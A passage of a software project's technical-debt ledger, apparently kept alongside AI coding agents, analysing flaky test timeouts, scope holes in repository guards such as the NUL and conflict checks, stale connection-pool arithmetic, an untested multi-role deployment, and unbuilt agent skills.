| the same file standalone, same commit | 5.66 | **3 runs of 3 green** (`Tests 6 passed` each) |
| the next push attempt, the same suite | 5.08 | PASS, 15.07 s |

41.35 s against 15.07 s for the identical suite, and a 30 s inner deadline that only misses under the
heavier one.

**Why this is one entry about a class, not a second entry about a file.** The sibling is already in this
ledger under "Discovered work": `loki/index.test.ts`'s million-iteration census, which failed once inside a
full `verify` and passed standalone. That *instance* was closed at `763dd6a` with `{ timeout: 25_000 }`
(`packages/integrations/src/providers/loki/index.test.ts:198`) and the distribution written into its
docblock (`:158-197`) — 1,103 ms alone at load 11; 2,824 / 1,754 / 1,634 ms inside a full run at load
17/26/29; **failed** against the 5 s default at load ~57; 9,640 ms at load 96, *8.7x the first row for
identical work*. The instance is closed and **the class is not**: nothing in the ledger says where a
deadline over a parallel tier belongs, so the next one was written by hand too. A session that repairs one
file and leaves the others has not repaired anything.

**The sweep the class asks for** (rules 49 and 63; read-only grep, nothing run). **Five** hand-written
literals, not two, and three of them govern this one suite:
`conformance.contract.test.ts:69` and `:83` (30 s, contract tier), `runlet/testing.ts:229`
(`waitForProcessGone`, 15 s — *called by the conformance suite*), `runlet/shim.test.ts:102` and `:120`
(15 s, unit tier). Whatever the answer is, it is applied to all five, not to the one that fired.

**Why it is worse than a slow test.** Rule **56** records that this exact assertion was *deliberately
introduced*: `SpawnedProcess.kill()` returns `state.connection?.send(...) ?? false`, the previous test
slept 300 ms and asserted `true`, and it failed on `main` at load 150 **with the child perfectly healthy**,
blaming the child for a socket that was not up. The pid-file wait replaced it because it is a lower bound
on something structural and names the right component. The file's own docblock states the discipline —
*"no assertion in this file bounds a duration from above … lower bounds on something structural"*
(`conformance.contract.test.ts:20-24`). **A repair that weakens that pointing has traded one rule-56 defect
for another.**

**A contradiction in the evidence that must be resolved before anyone picks a number.** The `contract`
project sets **no** `testTimeout` (`vitest.config.ts:87-92`) and vitest 5.0.0 resolves
`resolved.testTimeout ??= resolved.browser.enabled ? 15e3 : 5e3` for a non-browser project, so on paper the
enclosing per-test budget is **5 s** — yet the observed failure is the helper's own 30 s deadline reported
at **31,482 ms**, which can only happen if the effective budget is above 31 s. One of those two readings is
wrong and nobody knows which. It decides the repair: if a 5 s enclosing budget really is in force, raising
the helper's deadline only relabels the failure `Test timed out in 5000ms` and throws away exactly the
component-pointing rule 56 paid for. **Needs verification** — by reading the resolved config, not by
inferring it, and not in this session (rule 66).

**What it costs to leave.** Not one red run. The pre-push hook is the gate that decides what reaches
`origin` (`lefthook.yml:31-36`), and a gate that fails on a file the pusher did not touch teaches the
pusher to `--no-verify` — which is precisely how `d1e7b69` put a whole merge conflict into `CLAUDE.md` and
left it on `main` for an hour (`lefthook.yml:24-30`). *A guard that fires on legitimate work gets switched
off* is the failure mode `conflict:check` was deliberately narrowed to avoid, and this is the same shape
arriving at the hook rather than at the checker.

**What "done" looks like.** A decision recorded **in the file** about which level owns the bound, plus the
repair it implies:
- the vitest-budget contradiction above resolved **first**;
- if the answer is a **number**, it carries the load it was measured at (rule 64) and it is applied across
  all five literals of the sweep. A generous number costs nothing here for the same reason the loki
  docblock gives: these waits assert *structure* and never a duration, so the timeout is infrastructure and
  not a performance guard, and a genuinely dead shim still fails at the speed it dies;
- if the answer is the **harness** — the real-process suites get their own project, or their concurrency is
  bounded — the file must still end up inside a `verify` target *and* inside the CI job that runs it
  (`scripts/verify-targets.ts`, held to `.github/workflows/ci.yml` by `scripts/verify.test.ts`), because a
  suite moved out of `verify` is a suite CI stops running: the WP-06→WP-10 `ignored:check` shape;
- mutation-checked either way (rule 3): with the repair in place, a shim that genuinely never spawns must
  still fail with a message naming the shim, not a bare timeout.

**Recommendation, labelled as one** (my judgement; the measurement that would decide it cannot be taken
here). Prefer the **harness-level** answer, with a documented generous bound as the cheap interim. The loki
census is CPU-bound, deterministic and counts iterations, so a measured number is honest there; this file
starts real `node` processes through the TS source resolver, a real Unix socket, an SDK `query()` and a
child CLI, and what it waits for is **process scheduling** — the exact quantity the orchestrator's own
parallelism moves by an order of magnitude (rule 66: a 14-core host, 10–14x oversubscription, load 137–196
observed). A number sized at load 12 is wrong at load 137 and idle at load 5. The precedent is already in
the same config file: `integration` and `e2e-fake-claude` carry their own `testTimeout` (120 s / 180 s) and
a `globalSetup` **because they own real resources** (`vitest.config.ts:95-119`); a suite that spawns
processes is the same kind of thing sitting in the wrong tier.

**Needs measurement** (not run here, rule 66 — no test target, and no synthetic load on this host): the
distribution of this file's six tests at the loads the fleet actually runs at, before any number is
written. Load generation is *retracted* on this machine (rule 66 records two kernel panics), so the sample
has to be collected from real runs — the pre-push hook already prints the suite's wall time on every push,
which is a free sample if somebody starts recording it with the load.

**Urgency — live, not latent.** It fired at load **12.63**, an ordinary two-agent session, not the 137 the
panic note records; and every tier that grows lengthens the parallel run.

> **Second instance, session 5 (2026-09-13, orchestrator's shell, no agent running).** `verify` on a
> **docs-only** tree at `24efdc7` failed the same case — *"relays a signal to the CLI and forwards its
> stderr"* — this time at the test's **own** budget, `Test timed out in 60000ms` (the per-test timeout has
> been raised since the first instance, so the helper's 30 s deadline no longer reports first), with the
> whole unit+contract suite at **65.09 s**; the 1-minute load was **7.97**. The immediate rerun passed at
> **13.61 s**. So the trigger is not the load average alone — something else on the host held the
> scheduler for a minute — and a bound sized at load 8 is still a coin flip (rule 57). The
> harness-level answer this entry recommends (the real-process suites in their own project with their own
> `testTimeout`, or bounded concurrency) is now the cheaper one: the suite has grown to 4 960 tests.
> Still unowned; still before whoever next touches `packages/infrastructure/src/runlet/`.

**Owner. None, and this entry says so plainly.** WP-13 wrote the file and is DONE; no plan row owns *the
timing bounds of a test tier*; `scripts/verify-targets.ts` owns the **list** of verification targets, not
their budgets. Whoever next touches `packages/infrastructure/src/runlet/` takes it, and preferably before
**WP-22**, which adds container work to the same suites. **Depends on** nothing but the verification and
the measurement named above.

### 3. Citation guard — the oracle shares a shape with the parser it audits (rule 65)
`scripts/citations.ts`: `CITATION_SITE` requires the backticked file token and `›` on the same **physical**
line, exactly as the parser does, so a citation wrapped *between* those two is read by neither and the
recall check reports **nothing at all** — measured: suite 12 passed, sites 18, failures `[]`. Fix by making
the site regex span a wrap (an oracle must over-approximate what it audits), or list the shared shape in
the docblock's gap list, which currently omits it.

**A third instance, session 4, and it is the *false positive* direction.** Q62's entry is one physical line
of about 2 600 characters, and it carries a correct citation —
`packages/infrastructure/src/workspace/spec.test.ts` › *"has no registry host, because discovery does not exist — so a run cannot install a package"* — followed later on the
**same** line by an unrelated quoted phrase, `"one more registry host"`. The parser paired the file token with
the wrong quote and reported *"no such test"*, reddening `verify` on a citation that was right. Fixed in the
**prose** (the later phrase now uses emphasis rather than double quotes) rather than in the guard, because the
guard was doing what it says. Worth recording because rule 58 and this entry both describe the *recall* hole
— a citation the parser cannot see — and this is the **precision** hole: a citation it sees twice. A fix that
spans a wrap (this entry's own recommendation) makes precision worse unless it also binds the quote to the
nearest marker. It has now cost three interruptions in one session, all on documentation, none on code — **four**, counting
the one this very paragraph caused by abbreviating the cited name with an ellipsis, which the guard correctly
refuses: an abbreviated test name is not a test name.

### 4. WP-15 round 2's minors (one-line each, from the approving review)
- `packages/application/src/pipeline/gates.test.ts:214-223` — the test **named** for the Q55 cut asserts the
  absence of the log *ref* (`'log:test:unit'`), not the log *body* (`'FAIL src/totals.test.ts'`, present in
  the fixture). An implementation that closed Q55 by appending log text would pass it unchanged. The pin
  that actually enforces the cut is the exact `toEqual` at `:167`. Assert `not.toContain` on the body.
- `gates.test.ts:199` — no case where the **only** failing job is `allow_failure`, so the
  `failed.length === 0` arm on a `failed` status is reached only via `canceled`/`skipped`. Moot in
  production (GitLab reports such a pipeline `success`); one line.

### 5. `SweepReport` cannot see a chained dispatch's failure (discovered work, WP-15)
A failure that does not surface is rule 10's shape at the infrastructure level. The reviewer confirmed it
undermines nothing today — `sweep.failed` is read in one place outside `outbox.ts`, and `outbox.ts:208`
uses it only for logging — so it is an observability gap, not a live defect. Fix it before anything starts
*trusting* `SweepReport`.

### 10. **`nul:check` cannot see a NUL in an untracked file** (TODO — **second instance at session 5**, closed for one census and still open here; **four guards share the hole**, counted under “Scope”)
**What is wrong.** The guard's scope is `git ls-files` (CLAUDE.md says so), so a **new** source file
carrying a literal NUL passes `verify` until it is staged.

> **Second instance, session 5 (rule 85).** The pool census written for backlog 28 was green in every local
> run of three agents and turned red in the pre-push hook, because its own file — matching its own regex —
> was untracked until the commit. That census now walks `git ls-files --others --exclude-standard` as well,
> with the decision stated in its docblock and a case planting a tracked, an untracked and an ignored file.
> `nul:check` is unchanged and this entry stays open; the shape of the fix is now in the tree to copy.

**Scope — the class, counted, and the guards that are clean** (refiner, session 5; grep only, rule 66).
Six tracked sources ask git for a file list. The method was a grep for `ls-files` over `.ts`, `.tsx`, `.mjs`
and `.js`, which cannot see a guard that shells out through a variable or a helper — so the list below is a
floor. **Four have this hole**, at the line each reads its list:

- `scripts/check-nul.mjs:57` — this entry's subject, and the behaviour is **pinned by a passing test**:
  `scripts/check-nul.test.ts:116-118` plants an untracked file full of NUL bytes and asserts
  `PASS: nul:check (3 tracked text files, 0 declared binary, none with a NUL byte)`, inside
  `scripts/check-nul.test.ts` › "passes on a tree of text files, and says how many it examined"
- `scripts/check-conflict.mjs:119` — the same guard shape and the same pin: an untracked file holding a
  whole conflict is *expected* to pass, at `scripts/check-conflict.test.ts:145-147`, inside
  `scripts/check-conflict.test.ts` › "passes on content that only looks like a marker, and says how many files it examined"
- `scripts/citations.test.ts:76` — the citation guard's own scope, so a citation written in a **new**
  untracked file resolves against nothing until `git add`. Narrowest of the four, because its subject is
  prose in files that are already tracked.
- `apps/launcher/src/docker-access.test.ts:55` — TD-021's census, scoped to `git ls-files -z -- *.ts *.tsx
  *.mjs *.js`, so a new file composing a Docker client is invisible to it until staged. Widest consequence
  of the four: it is the mechanical half of an amended decision record, not a formatting guard.

**Three were checked and do not have it**, which is what makes this a class with a boundary rather than an
open-ended worry (rules 44/63):

- `scripts/check-ignored.mjs:101` reads `git ls-files` **and** walks the untracked tree (`sourceRoots` at
  `:127`, `walkRootFiles` at `:155`, joined at `:195`), because an ignored file can never become tracked —
  it had to solve this problem to exist at all, and its docblock already states the two cases no derivation
  can see.
- `apps/web/src/no-html.test.ts:184` and
  `packages/integrations/src/providers/delivery-key-redaction.test.ts:107` read **disk** (`readdirSync`)
  rather than the index, so an untracked file is in scope for both. So does
  `test/contract/integrations/fixture-provenance.contract.test.ts:25`.

**Evidence.** WP-16's implementer wrote literal NULs into two brand-new files — `knowledge/globs.ts`,
where a NUL is the *right* sentinel and CLAUDE.md asks for the escape `\0`, and `kb-search.test.ts`,
where a single space was meant — while `nul:check` reported `PASS: nul:check (832 tracked text files,
…, none with a NUL byte)`. The first was found by **luck** (biome rendered the character in a
formatting diff); the second was found by `nul:check` itself, one second after `git add`, which is
the guard working exactly as designed. Full filing under "Discovered work", WP-16.

**What it costs to leave.** Narrow, and the window closes at `git add` — before the pre-commit hook
and long before a push — so nothing has ever reached `main` through it. What makes it worth an entry
rather than a shrug is the *class*: this is standing rule 7 (*a guard with a hand-maintained scope
drifts — ask git what it tracks*) reappearing inside a guard that exists because of rules 30 and 33,
and the scope it asks git for is the wrong question rather than a stale list. Rule 33's point applies
too: a `scripts/*.mjs` verify step has no test tier of its own, so the gap in its scope is not
something a mutation of the guard would reveal.

**What done looks like.** The sweep also walks `git ls-files --others --exclude-standard`, which is
one flag **plus a decision** that should not be made silently: whether a guard reads files git has
been told to ignore. It should not — an ignored file is not a source file — so `--exclude-standard`
is the whole answer, and the decision is worth one line in the script's docblock rather than a flag
nobody can explain later.

**The shape to copy is now in the tree** (session 5, backlog 28). The pool census unions the two lists at
`packages/infrastructure/src/db/pool-errors.test.ts:161-162` and tolerates at `:169` a path that disappears
between the listing and the read — the concurrent-editor case a `--others` sweep newly has to handle and a
tracked-only sweep never did, so it is worth copying rather than re-deriving. Its case is
`packages/infrastructure/src/db/pool-errors.test.ts` › "names a planted pool whether it is tracked or merely untracked, and skips an ignored one"
which builds a throwaway repository holding a tracked, an untracked and an ignored file and expects exactly
the first two. **Done for this entry is all four guards above carrying that**, not `nul:check` alone; the
two script guards additionally need their pinned pass cases rewritten, because a guard whose own suite
asserts the hole is a guard whose fix fails that suite — which is the cheap early signal that the change
landed, not an obstacle.

**Depends on.** Nothing. Owner: whoever next touches `scripts/`; cheap enough to fold into any WP — but
the `docker-access` and `citations` halves are outside `scripts/` and are owned by nobody at all.

**The transferable part is not the guard.** An agent editing through a tool can emit a byte it did
not intend and cannot see in its own output — twice in one work package, in two files, where a space
was meant. The check existed; its *scope* was the hole.

### 22. **The pool floor is one computed constant and seven hand-written restatements of it — two of them stale on `main` at `38ea686`** (TODO, small — the class behind three repairs in one day)
**What is wrong.** `requiredPoolConnections` computes the floor from `POOL_RESERVATIONS`
(`apps/server/src/config.ts:236-305`) and **seven** other places state the same arithmetic by hand,
in three media — a runtime string, six comments, and one *second default value* for the same knob in
another ring. None of them is read by the compiler or by a test as a claim. Three were repaired
during WP-15c (`runtime.ts` by the orchestrator, `config.ts` and `.env.example` by the implementer in
the pre-merge round) and **two others were not**, including one in the file everybody named as the
place the value lives.

**Evidence.** The reviewer named the class, verbatim:

> `apps/server/src/pipeline.ts` composing `pipeline.intake.reconcile` rather than
> `createPipelineRuntime` was a choice made under the file lock. It is defensible beside
> `registerPartitionMaintenance`, but it is why the pool term now has to be maintained across three
> files (`runtime.ts`, `config.ts`, `.env.example`) — which is exactly what finding 2 is a symptom
> of. A single derived constant would remove the class.

and the symptom it refers to, from the same review:

> Stale pool arithmetic, two places. `apps/server/src/config.ts:230` still reads *"the shape is
> `2N + 9` … (17 against 20 at N=4)"* and *"WP-15b's arithmetic reached 11 too"* three lines below
> its own corrected sum of **12**. `.env.example:176` still reads *"the pipeline's **three** job
> workers (+3: stage.execute, mr.comment.debounce, pipeline.outbound)"* and repeats *"(17 rather
> than 20 at N=4)"*. Measured at `pipeline: 4`: `2×4+1+2+4+2+1 = 18`, shape `2N + 10`. The numbers
> `config.test.ts` asserts (12, `APP_DB_POOL_MAX=14`) are right; only the prose is wrong — rule 63's
> own class, and the remainder of the locked-file incident.

**The two sites still wrong at `38ea686`, read off the tree while filing** (rule 66: read, not run):
- `apps/server/src/config.test.ts:134` — *"the pipeline's three job workers, HTTP and maintenance"*,
  inside the very test whose assertion is the number the review pointed at as correct. The assertion
  is symbolic (`POOL_RESERVATIONS.pipeline`, `:138`) and is therefore right; only its comment is
  wrong. Three repairs and the fourth site is in the source of truth.
- `packages/infrastructure/src/db/config.ts:85-93` — the docblock on the shipped default says *"that
  floor rose to **11** for `ROLE=all`"* and *"13 keeps the two connections of slack the previous
  default carried over its floor of 8"*. The floor is **12**, so the value it ships (`poolMax: 13`,
  `:94`) carries **one** connection of slack, not the two its own sentence claims. This is the class
  in a **value** rather than in prose, and it has a second half: **the two shipped defaults for the
  same knob differ** — 13 in code, `APP_DB_POOL_MAX=14` in `.env.example:192` — and **nothing holds
  the second**. `apps/server/src/config.test.ts:180-184` › *"accepts the documented default pool for
  the default concurrency"* comments *".env.example ships APP_DB_POOL_MAX=14"* but calls `load()`,
  which goes through `db.loadDatabaseConfig` (`config.ts:373`) and therefore exercises the **code**
  default 13. No test in the repository parses `.env.example` (`git grep` over `*.ts`/`*.mjs`: four
  files mention it, none reads it).

**The seven sites, with their medium** — because "a single derived constant" means a different thing
at each, and that is the first thing a future implementer needs:
1. `apps/server/src/config.ts:226-234` — docblock: the sum (**12**), the shape (**`2N + 10`**) and
   the history (`3N + 8`, `2N + 9`). Its own opening asks a reader not to *"reassemble it from four
   docblocks"*. Comment: checkable, never derivable.
2. `apps/server/src/config.ts:244-266` — `POOL_RESERVATIONS.pipeline`'s docblock, naming the four
   workers and why the fourth is counted unconditionally. Comment.
3. `apps/server/src/config.ts:314` — `UndersizedPoolError`'s **message**: *"the pipeline's four job
   workers"*. A runtime string that already interpolates `${required}`. **The one site that is
   genuinely derivable**: the word "four" sits beside a `POOL_RESERVATIONS.pipeline` it could read.
4. `.env.example:175-191` — comment, read by an operator **before the program exists**, so it can be
   checked but never computed at read time.
5. `packages/application/src/pipeline/runtime.ts:9-43` — docblock, and the site that **cannot** be
   derived even in principle: `biome.json`'s application override allows only `@platform/domain` and
   `@platform/contracts`, so no file in that ring may read `POOL_RESERVATIONS`. Its docblock now says
   exactly that and cites rule 63 — which is the right answer for that site, and is itself one more
   sentence to keep true.
6. `packages/infrastructure/src/db/config.ts:85-94` — docblock **and value**, same ring problem:
   `infrastructure` may import `application` and `prompts`, not `apps/*`.
7. `apps/server/src/config.test.ts:134` — comment.

**What it costs to leave.** Not a production defect at `38ea686`: the program computes 12, the test
asserts 12, and both shipped defaults (13 and 14) are above it, so every documented configuration
starts. What it costs is **a reader who believes a number** — an operator sizes a pool from
`.env.example`, an implementer changing a worker count reads whichever docblock is nearest, and two
of the seven currently say something false. It is standing rule **63**'s third instance in one day
(WP-15d's four places, then `runtime.ts`, then `config.ts` + `.env.example`); each of the first three
was caught by a reviewer going to look, and these two were not caught at all.

**What would make it urgent.** `APP_DISPATCH_MAX_CONCURRENCY=2` puts the floor at **14**, at which
the **code** default 13 refuses to boot while the **documented** default 14 starts — so an operator
who raised concurrency by one without copying `.env.example` meets `UndersizedPoolError` where the
documentation says they would not. It fails **closed**, with a message naming the fix, which is why
this is hygiene and not an incident.

**What done looks like — three mechanisms, one per medium, because only one site can be "derived".**
- **Derive the one that can be.** `UndersizedPoolError`'s message interpolates
  `POOL_RESERVATIONS.pipeline` instead of spelling *"four"*. One line, and it becomes incapable of
  going stale.
- **Stop restating in the ones that cannot be.** This is the bulk of it and it is rule 63's own
  remedy: a prose site that *repeats* the arithmetic can go stale, a prose site that *points at* the
  one place that states it cannot. `config.ts:226-234` is already that place; sites 2, 5, 6 and 7
  keep their local reason and drop the numbers. That also reaches the two stale sites without
  anybody having to notice they are stale.
- **Check the two numbers that must exist outside the sources.** `.env.example`'s
  `APP_DB_POOL_MAX=14` and `db/config.ts`'s `poolMax: 13` are values, not prose, and the honest
  criterion is that **each is asserted to be ≥ `requiredPoolConnections` at the shipped defaults,
  and their relationship is stated once** — one of them is the documented default and the other is
  what a process gets without a `.env`, and today nothing says which is intended. A test that parses
  `APP_DB_POOL_MAX` out of `.env.example` closes the half no test covers. Assert at **two** values
  of N, not one: `3N + 8`, `2N + 9` and `2N + 10` agree or nearly agree at N=1 (11, 11, 12) and
  separate at N=4 (20, 17, 18), which is exactly how a stale shape survives a one-point check.

**Explicitly *not* recommended: a general prose-arithmetic guard.** A `scripts/citations.ts`-style
parser over every arithmetic claim is the obvious-looking answer and should not be taken on this
evidence: citations.ts earned its parser from a false citation that *read as evidence*, it found two
defects in itself at WP-14 round 3, and backlog entry **3** is still open on the oracle sharing a
shape with the parser it audits. Seven sites in five files do not justify a second parser. The
trigger that would change that: the same claim going stale **again** after the sites are
deduplicated — deduplication failing is what would make a parser the next move rather than the first.

**The composition choice is not the cause, and this entry says so to keep it from being reopened.**
The review flagged `pipeline.intake.reconcile` being composed by `apps/server/src/pipeline.ts` rather
than by `createPipelineRuntime` as *"why the pool term now has to be maintained across three files"*.
Read against the tree that is an aggravator, not the cause: `POOL_RESERVATIONS` lives in `apps/server`
and always has, and it is the **dependency rule** — not the composition — that stops `runtime.ts`
(and `db/config.ts`) stating the process's term. Moving the worker into `createPipelineRuntime` would
let `runtime.ts` say *"one per worker I start"* completely and would remove **one** of the seven
sites, leaving six. Worth re-deciding on its own merits — it sits beside `registerPartitionMaintenance`
and is defensible there, and WP-15c's notes ask for it to be re-decided deliberately — but not worth
doing *for this*.

**Not an open question.** No product decision is involved: three small edits, one test, and the media
are a fact of the tree rather than a choice. Filing it in `OPEN-QUESTIONS.md` would ask the founder
where a comment should live.

**Needs measurement**: none. Every claim here — the seven sites, the two stale ones, the two
divergent defaults, the ring boundaries and the absence of a test that reads `.env.example` — is read
off the tree at `38ea686`. Nothing in it needs a test run.

**Depends on.** Nothing. **Owner: none today** — no plan row mentions the pool arithmetic, and
WP-15c, which added the fourth worker, is merged. Two known future changes touch it and each should
honour this rather than add an eighth site: entry **19**, whose "what done looks like" ends *"Worth
one line beside the floor's arithmetic saying that the port takes a transaction so that the 'holds'
claim is also true of borrows (rule 63)"* — that line is an eighth prose site unless it lands after
the deduplication; and **WP-22**, which owns `.env.example` and the compose file and is the first
work package to ship a default an operator actually runs. Related: entry **19** is the *same
arithmetic and a different defect* — what the number **counts** (a transient borrow that is not
reserved), not how many places restate it, so neither entry covers the other; and WP-15e's acceptance
criterion already carries rule 63's *"with the count stated in the change rather than left to a
reader to recount"*.

### 38. **`ROLE` splits the product across containers and no tier has ever started two processes with different roles** (TODO — **no work package owns it**; the general form of a risk WP-18b stated about one command)
**What is wrong.** `ROLE` is the platform's scaling story — *“splitting the roles across containers is the
first step of technical/01's scaling path and changes nothing but this variable”*
(`apps/server/src/role.ts:1-7`) — and that sentence is asserted by nothing. Every process this repository
has ever started, in every tier and in the shipped compose file, is `ROLE=all`.

**Evidence** (refiner, session 5 — file reads, no test run, rule 66).
- The e2e harness defaults the variable and no case overrides it: `ROLE: options.role ?? 'all'`
  (`test/e2e/support/instance.ts:93`, the option declared at `:56`). A sweep of `test/e2e` for a `role`
  argument finds only the two *user* roles (`viewer`, `member`) in
  `test/e2e/server/sse.e2e.test.ts:91` and `test/e2e/server/auth.e2e.test.ts:90`.
- The shipped deployment is one service: `ROLE: ${ROLE:-all}` (`compose.yml:102`).
- The strongest existing claim is about a **mechanism**, not a deployment: WP-15h's row says the transcript
  bridge is asserted against two real `LISTEN` sessions, *“so `ROLE=api` serves what `ROLE=worker`
  produced”*. Two hubs in one process is the right test of the bridge and is not a test of the split.
- WP-18b states the narrow form as a risk of its own: *“`ROLE=api` + `ROLE=worker` is untested as a
  deployment. The decide command takes a nullable `Jobs` on purpose and the nightly pass is the recovery,
  but no tier starts two processes with different roles, so ‘the approval is applied by the next hygiene
  pass’ is asserted only through the unit test that passes `jobs: null`.”*

**What it costs to leave.** The split is what an operator reaches for first when one instance is not enough,
and the failures it would expose are the ones a single process hides by construction: a job enqueued by the
API process and never subscribed to, a `LISTEN`/`NOTIFY` topic only the producer's own hub carries, a
readiness answer that differs per role (TD-023's amendment: `all` and `worker` are 503 until a pipeline is
composed, `api`/`runner`/`indexer` pass `dispatchReady: null`), and a pool floor whose per-role arithmetic
has never been run. That last one is worth stating precisely rather than overstating it:
`requiredPoolConnections` **does** branch on the role — `capabilities.worker` gates the dispatcher, jobs,
pipeline and knowledge reserves and `capabilities.api` gates the HTTP reserve
(`apps/server/src/config.ts:388-406`), and `UndersizedPoolError` names the role in its message
(`apps/server/src/config.ts:413-415`) — so the code is there and every branch of it except `all`'s is
unexecuted in every tier. Each of these is a first-hour failure for the self-hoster this product is for.

**What “done” looks like — what a two-process test would need**, so nobody has to design it twice:
- Two instances from the existing harness against **one** database and container — `role: 'api'` and
  `role: 'worker'` — which the harness already supports and no case uses.
- One assertion per crossing, and they are the point of the test, not the process count: a command issued
  to the **api** process has its effect performed by the **worker** (the knowledge decide → apply path is
  the cheapest, and is exactly WP-18b's untested claim); a transcript produced by the worker is streamed by
  the api process's `/events`; the api process answers `/readyz` while the worker is 503 for the documented
  reason; and each process refuses to start when its own pool floor is not met.
- **The connection budget is part of the design, not an afterthought**: the e2e tier already starts whole
  instances in parallel against one container, and WP-18b had to raise it to `max_connections=300` after
  three more workers pushed the `ROLE=all` floor to **16**. Two processes per case doubles that, and a tier
  that dies with `sorry, too many clients already` inside somebody else's file is how that was found the
  first time.

**What it is *not*.** Not the same as the **per-queue subscription** gap recorded in session 5's discovered
work for `ROLE=indexer` and `ROLE=runner` — that is about a role being a *narrower workload*, and this is
about the split being *exercised at all*. Both would be served by the same test tier; neither substitutes
for the other.

**Needs measurement**: nothing before starting. The work is a harness arrangement and the assertions above.

**Depends on / owner.** **None today, and it is not in backlog 7 or in TD-023** — TD-023's amendment
*describes* per-role readiness and is itself part of what goes unasserted. Nearest owners by subject: the
row that next touches `apps/server/src/runtime.ts`'s composition, or WP-22's successor for the compose
half (a second service in `compose.yml` is the honest place for the deployment to exist at all).

### 32. **`task_stages.state` has two vocabularies and neither is declared, so a *returned* stage is published as `completed`** (TODO, small — the deferral it was waiting for expired when WP-15 merged)

**What is wrong.** The column is `text` with a note deferring its vocabulary to a work package that is
now DONE, the interpreter writes one pair of words, the published DTO declares a different set of six,
and `GET /api/tasks/:task_id` bridges them with a hand-written mapping. The mapping is honest about
what it cannot know, but it is lossy in one direction that matters: a stage the pipeline **returned**
is stored `state = 'exited'` and is published as `completed`, so three of the DTO's six states
(`returned`, `skipped`, `failed`) are unreachable from any row this repository writes.

**Evidence** (WP-15h's implementer notes, assumption (b), session 5; refiner grep, no test run — rule 66).
- The deferral, still in the applied migration:
  `packages/infrastructure/src/db/migrations/0004_pipeline.sql:45` reads
  `-- State, outcome and return reason are free-form until WP-15 fixes the interpreter's vocabulary.`
  WP-15 merged at `79582c6` and `0012_pipeline_interpreter.sql:3-6` quotes that same note as its own
  premise while adding three other columns — so the sentence is **stale** (rule 83) and the
  vocabulary was never fixed.
- What is actually written: `'entered'` on entry and `'exited'` on exit, both as SQL literals —
  `packages/infrastructure/src/pipeline/postgres-pipeline-store.ts:360-378`. The return path writes
  `outcome: 'returned'` with that same `state = 'exited'`
  (`packages/application/src/pipeline/transitions.ts:179-185`).
- What is published: `state: z.enum(['pending', 'running', 'completed', 'returned', 'skipped', 'failed'])`
  — `packages/contracts/src/api.ts:209`.
- The bridge: `stageStateOf` maps `entered` with a null `exited_at` to `running`, `entered` with one
  and `exited` to `completed`, and **anything unrecognised to `pending`** —
  `apps/server/src/queries/pipeline-queries.ts:468-488`. Its docblock states the reasoning, and
  `pending` for an unknown row is the reading that claims least; it is still a claim about a row the
  projection does not understand.

**What it costs to leave.** BD-008's rework loops are a headline of the product, and the task screen
cannot show one: a stage returned for a second attempt looks finished. The information is not lost —
`outcome` is published beside the state — so a reader who knows to look can reconstruct it, which is
why this is small rather than major. The second cost is the shape: a projection that *maps* an
undeclared vocabulary cannot fail when a new writer invents a third word; it silently answers
`pending`.

**What "done" looks like.** Declare the vocabulary **in `packages/contracts`** — one exported schema
that the store's writer and the DTO both use — so `apps/server/src/queries/pipeline-queries.ts` does a
`parse` and an unknown value is an error rather than `pending`. Contracts is the right home rather
than the migration or the store: it is the only ring both the writer (`infrastructure`) and the
publisher (`apps/server`) may import, and the DTO enum already lives there. A migration adding a
`check` constraint or an enum type is optional and second; deleting the stale comment from a
**new** migration's prose (0004 is applied and never edited) is part of the same change. A returned
stage must publish `returned`.

**Depends on / owner.** **None today.** WP-15 owned the deferral and closed without it; the reader
that exposed it is WP-15h. Smallest sensible home is **WP-15h part 2** (it already touches this
projection) or the next row that writes a `task_stages` state. No measurement needed; needs a
decision on whether `skipped`/`failed` get writers at the same time or stay declared-and-unused.

### 24. **The ten platform skills were correctly refused at WP-17, and nothing mounts a skill** (**RESOLVED** at **WP-14a**, session 5 — *pending merge*, the change is uncommitted at the time of writing; kept for its evidence, and **tier 2's layout below is wrong**: see the refiner note at the end of this entry)
**What is wrong.** WP-17's plan row lists "platform skills" and the implementer did not build them.
**The refusal is right and is recorded here so it is not re-litigated**, together with the SDK fact
that makes it right — and with the half that *is* missing, which is a delivery path, not ten files.

**Evidence** (WP-17's implementer, verified by the reviewer in `node_modules`). The SDK's
`skills` option is a **filter over what the CLI discovers**, not a way to supply skills:

> `@anthropic-ai/claude-agent-sdk@0.3.267/sdk.d.ts:2109` — `skills?: string[] | 'all'`, documented as
> *"This is a context filter, not a sandbox: unlisted skills are hidden from…"*, with names matching
> the `SKILL.md` `name` / directory name.

So `RunSpec.skills` (`packages/application/src/ports/runner.ts:190` → `packages/infrastructure/src/runner/options.ts:152-153`)
can only name skills that are already on disk in the workspace, and technical/04:35 is where they get
there: *"copy platform skills into the workspace `.claude/skills/_platform/` at provisioning so
`settingSources: ['project']` discovers them"*. **Provisioning is `WorkspaceProvider.create`, and the
pipeline composes no `WorkspaceProvider`** (Q52 — the launcher has no transport, and
`unavailableClaudeRunner` throws). Ten `SKILL.md` files written now would be read by nothing, which is
entry **11**'s exact shape and the defect this session spent itself unwinding. The reviewer's verdict,
quoted: *"The refusal to ship the ten skills is correct — schedule them with provisioning."*

**Read off disk while filing this** (grep, no test run — rule 66), because it shows the gap is already
declared rather than merely planned:
- `packages/prompts/` has `roles/` (ten role prompts, WP-17) and **no `skills/` directory**.
- GitLab's registration already names one: `skill: { id: 'gitlab', path: 'packages/prompts/skills/gitlab' }`
  (`packages/integrations/src/providers/gitlab/index.ts:40`) — **a path that does not exist**. Loki's is
  honest about the same absence: `skill` is `null` with a docblock saying *"`packages/prompts/` still
  has no `skills/` directory … deliberately did not ship skills — nothing mounts them"*
  (`packages/integrations/src/providers/loki/provider.ts:195-197`).
- **Nothing reads `SkillRef` anywhere.** `skillRefSchema` is declared
  (`packages/application/src/ports/integrations/common.ts:254`) and there is no consumer of the
  `.skill` field in the tree.
- `createStageRunPlanner` sends `skills: []` (`packages/application/src/pipeline/planner.ts:333`), and
  `options.ts:152` omits the SDK option entirely when the list is empty. Per the same docblock
  (`sdk.d.ts:2089-2098`) *"omitted (default): no SDK auto-configuration. The CLI's own defaults still
  apply, so this is **not** 'skills off'"* — so today the platform applies **no filter** and whatever
  the project's own `.claude/skills` contains is enabled. That is **working as documented**, not a
  defect: product/13 § "Reuse of project skills" says project skills are deliberately available. It is
  worth knowing because the moment a per-role skill list exists it becomes a *restriction* on project
  skills too, which is a product choice product/13's least-privilege table does not currently make.

